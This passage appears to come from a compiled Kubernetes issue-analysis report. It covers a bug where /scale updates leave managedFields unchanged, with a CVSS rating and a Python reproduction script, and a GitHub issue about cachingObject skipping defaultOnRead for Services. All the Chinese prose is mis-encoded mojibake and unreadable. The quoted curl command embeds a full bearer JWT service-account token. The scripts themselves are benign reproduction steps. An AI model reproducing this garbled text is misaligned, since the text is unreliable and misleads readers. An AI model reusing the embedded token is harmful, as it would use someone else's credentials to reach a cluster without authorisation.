é—®é¢˜æ ¸å¿ƒåœ¨äºï¼šå½“ä¸€ä¸ªèµ„æºï¼ˆè‡ªå®šä¹‰èµ„æºCRæˆ–å†…ç½®èµ„æºï¼‰åœ¨åˆ›å»ºæ—¶æœªæŒ‡å®šå‰¯æœ¬æ•°ï¼ˆ`spec.replicas`ï¼‰ï¼Œåç»­é€šè¿‡å…¶`/scale`å­èµ„æºæ¥å£æ¥æ›´æ–°å‰¯æœ¬æ•°æ—¶ï¼Œè¯¥èµ„æºçš„`metadata.managedFields`å…ƒæ•°æ®æ²¡æœ‰è¢«æ­£ç¡®æ›´æ–°ã€‚æœ¬åº”è®°å½•ä¸‹æ¥æ›´æ–°`/scale`çš„æ“ä½œè€…ï¼ˆä¾‹å¦‚`m2`ï¼‰ç°åœ¨ç®¡ç†ç€`spec.replicas`å­—æ®µï¼Œä½†å®é™…ä¸Š`managedFields`ä¸­å¹¶æœªå‡ºç°ç›¸åº”æ¡ç›®ã€‚

è¿™ä¸ªé—®é¢˜çš„æ½œåœ¨å®‰å…¨é£é™©åœ¨äºç ´åäº†å­—æ®µæ‰€æœ‰æƒå’Œå†²çªæ£€æµ‹æœºåˆ¶ã€‚åœ¨å¤šæ§åˆ¶å™¨æˆ–å¤šç”¨æˆ·ç®¡ç†åŒä¸€ä¸ªèµ„æºçš„åœºæ™¯ä¸‹ï¼Œè¿™ä¸ªç¼ºé™·å¯èƒ½å¯¼è‡´éé¢„æœŸçš„è¡Œä¸ºã€‚

ä¾‹å¦‚ï¼Œä¸€ä¸ªæ°´å¹³åŠèˆ±è‡ªåŠ¨æ‰©ç¼©å™¨ï¼ˆHPAï¼‰é€šè¿‡`/scale`å­èµ„æºè°ƒæ•´äº†ä¸€ä¸ªDeploymentçš„å‰¯æœ¬æ•°ã€‚ç”±äºè¿™ä¸ªBugï¼Œ`managedFields`æ²¡æœ‰è®°å½•HPAæ˜¯`replicas`å­—æ®µçš„ç®¡ç†è€…ã€‚ä¹‹åï¼Œå¦‚æœä¸€ä¸ªç”¨æˆ·ï¼ˆæˆ–CI/CDæµæ°´çº¿ï¼‰ä½¿ç”¨Server-Side Applyé‡æ–°åº”ç”¨äº†ä¸åŒ…å«`replicas`å­—æ®µçš„åŸå§‹Deploymenté…ç½®ï¼ŒAPIæœåŠ¡å™¨ä¼šè®¤ä¸º`replicas`å­—æ®µæ— äººç®¡ç†ï¼Œå¯èƒ½ä¼šé”™è¯¯åœ°å°†å…¶é‡ç½®ä¸ºé»˜è®¤å€¼ï¼ˆé€šå¸¸æ˜¯1ï¼‰æˆ–å°†å…¶åˆ é™¤ï¼Œä»è€Œè¦†ç›–äº†HPAçš„æ‰©ç¼©å®¹å†³ç­–ã€‚

è¿™ç§è¡Œä¸ºå¯èƒ½å¯¼è‡´ï¼š
1.  **æœåŠ¡å¯ç”¨æ€§é™ä½ï¼ˆDoSï¼‰**ï¼šåº”ç”¨å¯èƒ½è¢«æ„å¤–ç¼©å®¹ï¼Œå¯¼è‡´æ— æ³•å¤„ç†ä¸šåŠ¡è´Ÿè½½ï¼Œå½¢æˆä¸€ç§é’ˆå¯¹ç‰¹å®šåº”ç”¨çš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚
2.  **é…ç½®çŠ¶æ€ä¸ä¸€è‡´**ï¼šèµ„æºçš„å®é™…çŠ¶æ€ï¼ˆ`spec.replicas`çš„å€¼ï¼‰ä¸ç®¡ç†è€…å…ƒæ•°æ®ï¼ˆ`managedFields`ï¼‰ä¸ä¸€è‡´ï¼Œä½¿å¾—è‡ªåŠ¨åŒ–ç®¡ç†å’Œå®¡è®¡å˜å¾—å›°éš¾å’Œä¸å¯é ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¯„ä¼°ï¼š
- **Attack Vector (AV): Network** - æ”»å‡»é€šè¿‡Kubernetes APIè¿›è¡Œã€‚
- **Attack Complexity (AC): Low** - å¤ç°æ­¥éª¤æ¸…æ™°ï¼Œæ— éœ€å¤æ‚æ¡ä»¶ã€‚
- **Privileges Required (PR): Low** - æ”»å‡»è€…éœ€è¦æ‹¥æœ‰å¯¹ç›®æ ‡èµ„æºçš„`update`æˆ–`patch`æƒé™ã€‚è¿™å¹¶éåŒ¿åæ”»å‡»ï¼Œä½†è®¸å¤šæ™®é€šç”¨æˆ·æˆ–æœåŠ¡è´¦å·éƒ½æ‹¥æœ‰æ­¤ç±»æƒé™ã€‚
- **User Interaction (UI): None** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
- **Scope (S): Changed** - APIæœåŠ¡å™¨çš„æ¼æ´ï¼ˆç»„ä»¶Aï¼‰å½±å“äº†ç”¨æˆ·å·¥ä½œè´Ÿè½½çš„å¯ç”¨æ€§ï¼ˆç»„ä»¶Bï¼‰ã€‚
- **Confidentiality (C): None** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
- **Integrity (I): Low** - å½±å“äº†å¯¹è±¡é…ç½®çš„å®Œæ•´æ€§ï¼Œä½†ä»…é™äºç‰¹å®šå­—æ®µçš„å†²çªè§£å†³é€»è¾‘ã€‚
- **Availability (A): Low** - å¯èƒ½å¯¼è‡´å•ä¸ªå·¥ä½œè´Ÿè½½çš„å¯ç”¨æ€§é—®é¢˜ï¼Œè€Œéæ•´ä¸ªé›†ç¾¤ã€‚

ç»¼åˆè¯„åˆ†ä¸º **6.4 (Medium)**ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬äº”æ¡ï¼šâ€œåœ¨é£é™©ç±»å‹ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»...åˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©â€ï¼Œç”±äºæ­¤æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡å¯¹èµ„æºçš„ä¿®æ”¹æƒé™ï¼Œå› æ­¤é£é™©ç­‰çº§åº”åˆ¤å®šä¸º**ä½é£é™©**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import yaml
import signal
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# å®šä¹‰èµ„æºåç§°ç­‰å¸¸é‡
CRD_NAME = "mypods.example.com"
CR_NAME = "test"
NAMESPACE = "default"
GROUP = "example.com"
VERSION = "v1"
PLURAL = "mypods"

# è®¾ç½®2åˆ†é’Ÿè¶…æ—¶
class TimeoutException(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutException("Script executed for more than 2 minutes and was terminated.")

def create_crd(api_ext_v1):
    """åˆ›å»ºCRD"""
    crd_body_str = """
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: mypods.example.com
spec:
  group: example.com
  versions:
    - name: v1
      served: true
      storage: true
      schema:
        openAPIV3Schema:
          type: object
          properties:
            spec:
              type: object
              properties:
                name:
                  type: string
                replicas:
                  type: integer
            status:
              type: object
              properties:
                replicas:
                  type: integer
      subresources:
        status: {}
        scale:
          specReplicasPath: .spec.replicas
          statusReplicasPath: .status.replicas
  scope: Namespaced
  names:
    plural: mypods
    singular: mypod
    kind: MyPod
    shortNames:
      - mpo
"""
    crd_body = yaml.safe_load(crd_body_str)
    try:
        print(f"[*] åˆ›å»º CRD '{CRD_NAME}'...")
        api_ext_v1.create_custom_resource_definition(body=crd_body)
        print(f"[+] CRD '{CRD_NAME}' åˆ›å»ºæˆåŠŸã€‚ç­‰å¾… CRD çŠ¶æ€å˜ä¸º 'Established'...")
        # ç­‰å¾…CRDç”Ÿæ•ˆ
        for _ in range(10):
            time.sleep(1)
            crd = api_ext_v1.read_custom_resource_definition(name=CRD_NAME)
            for condition in crd.status.conditions:
                if condition.type == 'Established' and condition.status == "True":
                    print("[+] CRD å·²ç”Ÿæ•ˆã€‚")
                    return
        print("[!] CRD ç”Ÿæ•ˆè¶…æ—¶ã€‚")
    except ApiException as e:
        if e.status == 409:
            print(f"[+] CRD '{CRD_NAME}' å·²å­˜åœ¨ï¼Œè·³è¿‡åˆ›å»ºã€‚")
        else:
            print(f"[!] åˆ›å»º CRD æ—¶å‘ç”Ÿé”™è¯¯: {e}")
            raise

def create_cr_with_ssa(custom_api):
    """ä½¿ç”¨ Server-Side Apply åˆ›å»º CR"""
    cr_body_str = """
apiVersion: example.com/v1
kind: MyPod
metadata:
  name: test
spec:
  name: mypod
"""
    cr_body = yaml.safe_load(cr_body_str)
    try:
        print(f"[*] ä½¿ç”¨ manager 'm1' Server-Side Apply åˆ›å»º CR '{CR_NAME}'...")
        custom_api.patch_namespaced_custom_object(
            group=GROUP,
            version=VERSION,
            namespace=NAMESPACE,
            plural=PLURAL,
            name=CR_NAME,
            body=cr_body,
            field_manager="m1",
            force=True, # å¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»º
            _headers={'Content-Type': 'application/apply-patch+yaml'}
        )
        print(f"[+] CR '{CR_NAME}' åˆ›å»ºæˆåŠŸã€‚")
    except ApiException as e:
        print(f"[!] åˆ›å»º CR æ—¶å‘ç”Ÿé”™è¯¯: {e}")
        raise

def patch_scale_subresource(custom_api):
    """é€šè¿‡ /scale å­èµ„æºæ›´æ–° replicas"""
    scale_patch_body = {
        "spec": {
            "replicas": 2
        }
    }
    try:
        print("[*] ä½¿ç”¨ manager 'm2' æ›´æ–° /scale å­èµ„æº...")
        custom_api.patch_namespaced_custom_object_scale(
            group=GROUP,
            version=VERSION,
            namespace=NAMESPACE,
            plural=PLURAL,
            name=CR_NAME,
            body=scale_patch_body,
            field_manager="m2"
        )
        print("[+] /scale å­èµ„æºæ›´æ–°æˆåŠŸã€‚")
    except ApiException as e:
        print(f"[!] æ›´æ–° /scale å­èµ„æºæ—¶å‘ç”Ÿé”™è¯¯: {e}")
        raise

def verify_and_report(custom_api):
    """éªŒè¯å¹¶æŠ¥å‘Šç»“æœ"""
    print("\n[*] æ­£åœ¨è·å–æœ€ç»ˆçš„ CR å¯¹è±¡è¿›è¡ŒéªŒè¯...")
    try:
        final_cr = custom_api.get_namespaced_custom_object(
            group=GROUP,
            version=VERSION,
            namespace=NAMESPACE,
            plural=PLURAL,
            name=CR_NAME
        )
        
        spec = final_cr.get("spec", {})
        replicas = spec.get("replicas")
        managed_fields = final_cr.get("metadata", {}).get("managedFields", [])

        print("\n" + "="*20 + " éªŒè¯ç»“æœ " + "="*20)
        
        print(f"\n[>] spec.replicas çš„å€¼:")
        print(f"    - å€¼ä¸º: {replicas}")
        if replicas == 2:
            print("    - çŠ¶æ€: æ­£ç¡® (å€¼å·²æ›´æ–°ä¸º 2)")
        else:
            print(f"    - çŠ¶æ€: é”™è¯¯ (æœŸæœ›å€¼ä¸º 2, å®é™…ä¸º {replicas})")

        print("\n[>] metadata.managedFields çš„å†…å®¹:")
        print(yaml.dump(managed_fields, indent=2))
        
        manager_m2_found = False
        replicas_field_found_for_m2 = False
        
        for field in managed_fields:
            if field.get("manager") == "m2":
                manager_m2_found = True
                # fieldsV1 æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥ f:spec.f:replicas æ˜¯å¦å­˜åœ¨
                if "f:spec" in field.get("fieldsV1", {}) and "f:replicas" in field["fieldsV1"]["f:spec"]:
                    replicas_field_found_for_m2 = True
                    break

        print("\n[>] é—®é¢˜å¤ç°éªŒè¯:")
        if not manager_m2_found and replicas == 2:
            print("    - [æˆåŠŸå¤ç°] 'managedFields' ä¸­æœªæ‰¾åˆ° manager 'm2' çš„æ¡ç›®ï¼Œ")
            print("      å°½ç®¡ `spec.replicas` çš„å€¼å·²æˆåŠŸæ›´æ–°ã€‚è¿™è¯æ˜äº†ç¼ºé™·çš„å­˜åœ¨ã€‚")
        elif replicas_field_found_for_m2:
            print("    - [æœªå¤ç°] 'managedFields' ä¸­æ‰¾åˆ°äº† 'm2' å¯¹ 'spec.replicas' çš„ç®¡ç†è®°å½•ã€‚")
        else:
            print("    - [æœªå¤ç°] å‡ºç°éé¢„æœŸç»“æœï¼Œè¯·æ£€æŸ¥è„šæœ¬å’Œç¯å¢ƒã€‚")

        print("\n" + "="*52)

    except ApiException as e:
        print(f"[!] è·å– CR è¿›è¡ŒéªŒè¯æ—¶å‘ç”Ÿé”™è¯¯: {e}")
        raise

def cleanup(api_ext_v1, custom_api):
    """æ¸…ç†èµ„æº"""
    print("\n[*] å¼€å§‹æ¸…ç†èµ„æº...")
    try:
        print(f"[*] åˆ é™¤ CR '{CR_NAME}'...")
        custom_api.delete_namespaced_custom_object(
            group=GROUP,
            version=VERSION,
            namespace=NAMESPACE,
            plural=PLURAL,
            name=CR_NAME,
            body=client.V1DeleteOptions()
        )
        print(f"[+] CR '{CR_NAME}' å·²åˆ é™¤ã€‚")
    except ApiException as e:
        if e.status != 404:
            print(f"[!] åˆ é™¤ CR æ—¶å‘ç”Ÿé”™è¯¯: {e}")
        else:
            print(f"[+] CR '{CR_NAME}' ä¸å­˜åœ¨ï¼Œæ— éœ€åˆ é™¤ã€‚")

    try:
        print(f"[*] åˆ é™¤ CRD '{CRD_NAME}'...")
        api_ext_v1.delete_custom_resource_definition(name=CRD_NAME)
        print(f"[+] CRD '{CRD_NAME}' å·²åˆ é™¤ã€‚")
    except ApiException as e:
        if e.status != 404:
            print(f"[!] åˆ é™¤ CRD æ—¶å‘ç”Ÿé”™è¯¯: {e}")
        else:
            print(f"[+] CRD '{CRD_NAME}' ä¸å­˜åœ¨ï¼Œæ— éœ€åˆ é™¤ã€‚")

def main():
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(120)  # 2 minutes timeout

    api_ext_v1 = None
    custom_api = None
    
    try:
        config.load_kube_config()
        api_ext_v1 = client.ApiextensionsV1Api()
        custom_api = client.CustomObjectsApi()
        
        # ç¡®ä¿æ¸…ç†ä¹‹å‰çš„æ®‹ç•™èµ„æº
        cleanup(api_ext_v1, custom_api)

        # 1. åˆ›å»º CRD
        create_crd(api_ext_v1)
        
        # 2. ä½¿ç”¨ SSA åˆ›å»º CR (manager: m1)
        create_cr_with_ssa(custom_api)
        
        # 3. æ›´æ–° /scale å­èµ„æº (manager: m2)
        patch_scale_subresource(custom_api)
        
        # 4. éªŒè¯ç»“æœ
        verify_and_report(custom_api)

    except TimeoutException as e:
        print(f"[!] {e}")
    except Exception as e:
        print(f"\n[!!!] è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        if api_ext_v1 and custom_api:
            cleanup(api_ext_v1, custom_api)
        signal.alarm(0) # å–æ¶ˆé—¹é’Ÿ

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ä½¿ç”¨`kubernetes`å®˜æ–¹Pythonå®¢æˆ·ç«¯åº“æ¥å¤ç°Issueä¸­æè¿°çš„é—®é¢˜ï¼Œå…¶å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š

1.  **åˆå§‹åŒ–ä¸é…ç½®**ï¼š
    *   è„šæœ¬é¦–å…ˆåŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ä»¥è¿æ¥åˆ°Kubernetesé›†ç¾¤ã€‚
    *   åˆ›å»ºä¸`apiextensions.k8s.io/v1`ï¼ˆç”¨äºç®¡ç†CRDï¼‰å’Œ`CustomObjectsApi`ï¼ˆç”¨äºæ“ä½œCRï¼‰äº¤äº’çš„APIå®¢æˆ·ç«¯ã€‚
    *   è®¾ç½®äº†ä¸€ä¸ª2åˆ†é’Ÿçš„è¶…æ—¶å®šæ—¶å™¨ï¼Œä»¥é˜²æ­¢è„šæœ¬æ— é™æœŸæ‰§è¡Œã€‚

2.  **èµ„æºæ¸…ç† (å‰ç½®)**ï¼š
    *   åœ¨æ‰§è¡Œä¸»è¦é€»è¾‘å‰ï¼Œä¼šå…ˆå°è¯•åˆ é™¤ä¹‹å‰å¯èƒ½æ®‹ç•™çš„åŒåCRå’ŒCRDï¼Œç¡®ä¿ä¸€ä¸ªå¹²å‡€çš„æµ‹è¯•ç¯å¢ƒã€‚

3.  **æ­¥éª¤1ï¼šåˆ›å»ºCRD**ï¼š
    *   è„šæœ¬å®šä¹‰äº†ä¸Issueä¸­ç›¸åŒçš„`CustomResourceDefinition` (CRD)ï¼Œè¯¥CRDåŒ…å«ä¸€ä¸ª`/scale`å­èµ„æºï¼Œå¹¶å°†`.spec.replicas`è·¯å¾„æ˜ å°„åˆ°æ‰©ç¼©å®¹æ“ä½œã€‚
    *   é€šè¿‡`create_custom_resource_definition`æ–¹æ³•åˆ›å»ºCRDï¼Œå¹¶ç­‰å¾…å…¶`Established`çŠ¶æ€å˜ä¸º`True`ï¼Œç¡®ä¿CRDåœ¨é›†ç¾¤ä¸­å·²å®Œå…¨å¯ç”¨ã€‚

4.  **æ­¥éª¤2ï¼šä½¿ç”¨Server-Side Applyåˆ›å»ºCR**ï¼š
    *   è„šæœ¬æ¨¡æ‹Ÿäº†`kubectl apply --server-side --field-manager m1`çš„è¡Œä¸ºã€‚å®ƒå®šä¹‰äº†ä¸€ä¸ªä¸åŒ…å«`spec.replicas`å­—æ®µçš„`MyPod`è‡ªå®šä¹‰èµ„æºï¼ˆCRï¼‰å®ä¾‹ã€‚
    *   ä½¿ç”¨`patch_namespaced_custom_object`æ–¹æ³•ï¼Œå¹¶è®¾ç½®`field_manager='m1'`å’Œ`Content-Type: application/apply-patch+yaml`å¤´ï¼Œæ¥æ‰§è¡ŒServer-Side Applyæ“ä½œã€‚`force=True`å‚æ•°ç¡®ä¿å¦‚æœCRä¸å­˜åœ¨åˆ™ä¼šè¢«åˆ›å»ºã€‚

5.  **æ­¥éª¤3ï¼šæ›´æ–°/scaleå­èµ„æº**ï¼š
    *   æ­¤æ­¥éª¤æ¨¡æ‹Ÿ`kubectl scale`å‘½ä»¤ã€‚è„šæœ¬è°ƒç”¨`patch_namespaced_custom_object_scale`æ–¹æ³•ï¼Œä½¿ç”¨`field_manager='m2'`å°†`spec.replicas`æ›´æ–°ä¸º2ã€‚

6.  **æ­¥éª¤4ï¼šéªŒè¯å’ŒæŠ¥å‘Š**ï¼š
    *   è„šæœ¬è·å–æ›´æ–°åçš„CRå¯¹è±¡ã€‚
    *   å®ƒä¼šæ£€æŸ¥å¹¶æ‰“å°`spec.replicas`çš„å€¼ï¼Œç¡®è®¤å…¶æ˜¯å¦å·²æˆåŠŸæ›´æ–°ä¸º2ã€‚
    *   æ¥ç€ï¼Œå®ƒä¼šæ‰“å°`metadata.managedFields`çš„å®Œæ•´å†…å®¹ã€‚
    *   æœ€åï¼Œè„šæœ¬è¿›è¡Œæ–­è¨€ï¼šå®ƒéªŒè¯`spec.replicas`çš„å€¼ç¡®å®æ˜¯2ï¼Œä½†`managedFields`ä¸­**æ²¡æœ‰**ä¸º`manager` `m2`åˆ›å»ºä»»ä½•æ¡ç›®ã€‚å¦‚æœè¿™ä¸ªæ¡ä»¶æˆç«‹ï¼Œåˆ™è¯´æ˜æˆåŠŸå¤ç°äº†è¯¥æ¼æ´ã€‚

7.  **èµ„æºæ¸…ç† (åç½®)**ï¼š
    *   åœ¨è„šæœ¬æ‰§è¡Œå®Œæ¯•æˆ–å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œ`finally`å—ä¼šç¡®ä¿æ‰§è¡Œæ¸…ç†å‡½æ•°ï¼Œåˆ é™¤æœ¬æ¬¡è¿è¡Œåˆ›å»ºçš„CRå’ŒCRDï¼Œä¿æŒé›†ç¾¤çš„æ•´æ´ã€‚

è¯¥è„šæœ¬é€šè¿‡ç¼–ç¨‹æ–¹å¼ç²¾ç¡®åœ°é‡ç°äº†Issueä¸­çš„æ‰‹åŠ¨æ­¥éª¤ï¼Œå¹¶è‡ªåŠ¨éªŒè¯äº†é—®é¢˜çš„æ ¸å¿ƒâ€”â€”`managedFields`åœ¨ç‰¹å®šæ“ä½œä¸‹æœªèƒ½è¢«æ­£ç¡®æ›´æ–°ï¼Œä»è€Œç›´è§‚åœ°è¯æ˜äº†è¯¥ç¼ºé™·çš„å­˜åœ¨ã€‚

---


## Issue #131779 cachingObject will skip the defaultOnRead method when pushing events

- Issue é“¾æ¥ï¼š[#131779](https://github.com/kubernetes/kubernetes/issues/131779)

### Issue å†…å®¹

#### What happened?

Background:
If an older cluster (version < 1.20, which does not support the IPFamilies field) is upgraded to version 1.20 or above, and the Service objects in the cluster have never been updated, the Service objects stored in ETCD will still not include the IPFamilies field.
In this scenario, if you patch the status of such a Service, the modified event observed via watch will not include the IPFamilies field either.

#### What did you expect to happen?

We expect that after the decorator, the service object should be given the default IPFamilies field.
```go
// defaultOnRead sets interlinked fields that were not previously set on read.
// We can't do this in the normal defaulting path because that same logic
// applies on Get, Create, and Update, but we need to distinguish between them.
//
// This will be called on both Service and ServiceList types.
func (r *REST) defaultOnRead(obj runtime.Object) {
	switch s := obj.(type) {
	case *api.Service:
		r.defaultOnReadService(s)
	case *api.ServiceList:
		r.defaultOnReadServiceList(s)
	default:
		// This was not an object we can default.  This is not an error, as the
		// caching layer can pass through here, too.
	}
}
```
But actually there is not.

#### How can we reproduce it (as minimally and precisely as possible)?

1. We can watch a service object that does not have an ipfamilies field in etcd
2. Then we try to patch the status field of this object

```shell
[root@192-168-1-59 paas]# curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjU0Ykh6T2FxZlV6dllmOUtSbXZNcEwwVm5EeTRfNWl3d3hkczIyWVg1bTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQ3MDQ0MTUyLCJpYXQiOjE3NDcwNDA1NTIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiMjBhNTcwOTQtYTA0MC00MGQ1LWFiODctMDRiNmQwNzAwMzYwIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im15LXNlcnZpY2Utc2EiLCJ1aWQiOiI5MTU2N2JmOS1jZTU5LTQyNzYtYTJjYS0xYmZhOWRjZGY1YzAifX0sIm5iZiI6MTc0NzA0MDU1Miwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6bXktc2VydmljZS1zYSJ9.hdsmc2yxlr69-7jvZkWBbY7ufLT4AGSZ0G-nn7CfPLySzcgNFk5aOSsFGPlviC2wjQFSkqgnIJp0rl41B-rCu6-B8wtubZC-Q6KEVc3bhmc0IBmQv8bXw5-vc1FAEJ528AlOu-QW--1CjDhjg_5qS6tMo2xzSx4zWXrSnLRhyyDvZX_0bLncayU_5WtnkS-wlnlzqVTi0ozEK5Eg63zcAiwJV80VrZ1lsiVKRVYg73PbA2yf2-0kizcOtLjDbNxovQedZpPnj1-M_jQjrzeVPapqvKByDutv_SjEbEIR4VjOmPPgE2l-pa_ZOh1Ps71OKgwiEWdoiRfi8qRIgt91p0wW9lUzm1-vden7qYkatoRi99X6xImtB33k-KAim_gaaE89Y45AgSfAyn-m2NetIubajii2GkM7TSbMvg1IaI2JgDmM5dfgWzVBzo1yHGIdcrvgUs2xVcGkRGMOzP-D86_6Nod_B2VI-PvvM1BBcsXj1acIGaqLGcyvyuJSdN9z"   -H "Content-Type: application/merge-patch+json"   -X PATCH      https://192.168.1.59:5443/api/v1/namespaces/default/services/cce-network-elbv3-1/status      -d '{"status":{"loadBalancer":{"ingress":[{"ip":"8.8.8.10"}]}}}'
```
3. We will see the following results:
```shell
[root@192-168-1-31 bin]# kubectl get --raw="/api/v1/namespaces/default/services?fieldSelector=metadata.name%3Dcce-network-elbv3-1&resourceVersion=0&watch=true"
{"type":"ADDED","object":{"kind":"Service","apiVersion":"v1","metadata":{"name":"cce-network-elbv3-1","namespace":"default","uid":"2cb7dc17-6ba0-46f3-89cd-43d817e44176","resourceVersion":"15908885","creationTimestamp":"2025-04-30T07:30:40Z","labels":{"app":"cce-network-elbv3-1"},"annotations":{"kubernetes.io/elb.class":"performance","kubernetes.io/elb.health-check-flag":"on","kubernetes.io/elb.health-check-option":"{\"protocol\":\"TCP\",\"delay\":\"5\",\"timeout\":\"10\",\"max_retries\":\"3\"}","kubernetes.io/elb.id":"3bfae618-6360-427f-ba71-8ff81f9e7574","kubernetes.io/elb.lb-algorithm":"ROUND_ROBIN","kubernetes.io/elb.mark":"0"},"finalizers":["service.kubernetes.io/load-balancer-cleanup"],"managedFields":[{"manager":"kubectl-create","operation":"Update","apiVersion":"v1","time":"2025-04-30T07:30:40Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubernetes.io/elb.class":{},"f:kubernetes.io/elb.health-check-flag":{},"f:kubernetes.io/elb.health-check-option":{},"f:kubernetes.io/elb.id":{},"f:kubernetes.io/elb.lb-algorithm":{}},"f:labels":{".":{},"f:app":{}}},"f:spec":{"f:externalTrafficPolicy":{},"f:ports":{".":{},"k:{\"port\":2394,\"protocol\":\"TCP\"}":{".":{},"f:name":{},"f:port":{},"f:protocol":{},"f:targetPort":{}}},"f:selector":{},"f:sessionAffinity":{},"f:type":{}}}},{"manager":"huawei-cloud-controller-manager","operation":"Update","apiVersion":"v1","time":"2025-04-30T07:31:00Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{"f:kubernetes.io/elb.mark":{}},"f:finalizers":{".":{},"v:\"service.kubernetes.io/load-balancer-cleanup\"":{}}},"f:spec":{"f:loadBalancerIP":{}}}},{"manager":"curl","operation":"Update","apiVersion":"v1","time":"2025-05-12T05:41:01Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:loadBalancer":{"f:ingress":{}}}},"subresource":"status"}]},"spec":{"ports":[{"name":"cce-service-0","protocol":"TCP","port":2394,"targetPort":80,"nodePort":32580}],"selector":{"app":"three-container-2050-1"},"clusterIP":"10.247.163.187","clusterIPs":["10.247.163.187"],"type":"LoadBalancer","sessionAffinity":"None","loadBalancerIP":"192.168.3.218","externalTrafficPolicy":"Cluster","ipFamilies":["IPv4"],"ipFamilyPolicy":"SingleStack","allocateLoadBalancerNodePorts":true,"internalTrafficPolicy":"Cluster"},"status":{"loadBalancer":{"ingress":[{"ip":"8.8.8.9","ipMode":"VIP"}]}}}}
{"type":"MODIFIED","object":{"kind":"Service","apiVersion":"v1","metadata":{"name":"cce-network-elbv3-1","namespace":"default","uid":"2cb7dc17-6ba0-46f3-89cd-43d817e44176","resourceVersion":"16097303","creationTimestamp":"2025-04-30T07:30:40Z","labels":{"app":"cce-network-elbv3-1"},"annotations":{"kubernetes.io/elb.class":"performance","kubernetes.io/elb.health-check-flag":"on","kubernetes.io/elb.health-check-option":"{\"protocol\":\"TCP\",\"delay\":\"5\",\"timeout\":\"10\",\"max_retries\":\"3\"}","kubernetes.io/elb.id":"3bfae618-6360-427f-ba71-8ff81f9e7574","kubernetes.io/elb.lb-algorithm":"ROUND_ROBIN","kubernetes.io/elb.mark":"0"},"finalizers":["service.kubernetes.io/load-balancer-cleanup"],"managedFields":[{"manager":"kubectl-create","operation":"Update","apiVersion":"v1","time":"2025-04-30T07:30:40Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubernetes.io/elb.class":{},"f:kubernetes.io/elb.health-check-flag":{},"f:kubernetes.io/elb.health-check-option":{},"f:kubernetes.io/elb.id":{},"f:kubernetes.io/elb.lb-algorithm":{}},"f:labels":{".":{},"f:app":{}}},"f:spec":{"f:externalTrafficPolicy":{},"f:ports":{".":{},"k:{\"port\":2394,\"protocol\":\"TCP\"}":{".":{},"f:name":{},"f:port":{},"f:protocol":{},"f:targetPort":{}}},"f:selector":{},"f:sessionAffinity":{},"f:type":{}}}},{"manager":"huawei-cloud-controller-manager","operation":"Update","apiVersion":"v1","time":"2025-04-30T07:31:00Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{"f:kubernetes.io/elb.mark":{}},"f:finalizers":{".":{},"v:\"service.kubernetes.io/load-balancer-cleanup\"":{}}},"f:spec":{"f:loadBalancerIP":{}}}},{"manager":"curl","operation":"Update","apiVersion":"v1","time":"2025-05-12T09:02:53Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:loadBalancer":{"f:ingress":{}}}},"subresource":"status"}]},"spec":{"ports":[{"name":"cce-service-0","protocol":"TCP","port":2394,"targetPort":80,"nodePort":32580}],"selector":{"app":"three-container-2050-1"},"clusterIP":"10.247.163.187","type":"LoadBalancer","sessionAffinity":"None","loadBalancerIP":"192.168.3.218","externalTrafficPolicy":"Cluster","allocateLoadBalancerNodePorts":true,"internalTrafficPolicy":"Cluster"},"status":{"loadBalancer":{"ingress":[{"ip":"8.8.8.10","ipMode":"VIP"}]}}}}
```
4. At the same time, we will also see a message in the kube-controller-manager log:
```shell
I0512 13:41:01.898451       6 utils.go:323] "Couldn't find ipfamilies for service. This could happen if controller manager is connected to an old apiserver that does not support ip families yet. EndpointSlices for this Service will use addressType as the IP Family based on familyOf(ClusterIP)." logger="endpointslice-controller" service="default/cce-network-elbv3-1" addressType="IPv4" clusterIP="10.247.163.187"
```

#### Anything else we need to know?

I think the root cause of the problem occurs in the `setCachingObjects` method. The object in the event is set to `cachingObject`, which causes the default field to not be processed when passing through the decorator.
```go
func setCachingObjects(event *watchCacheEvent, versioner storage.Versioner) {
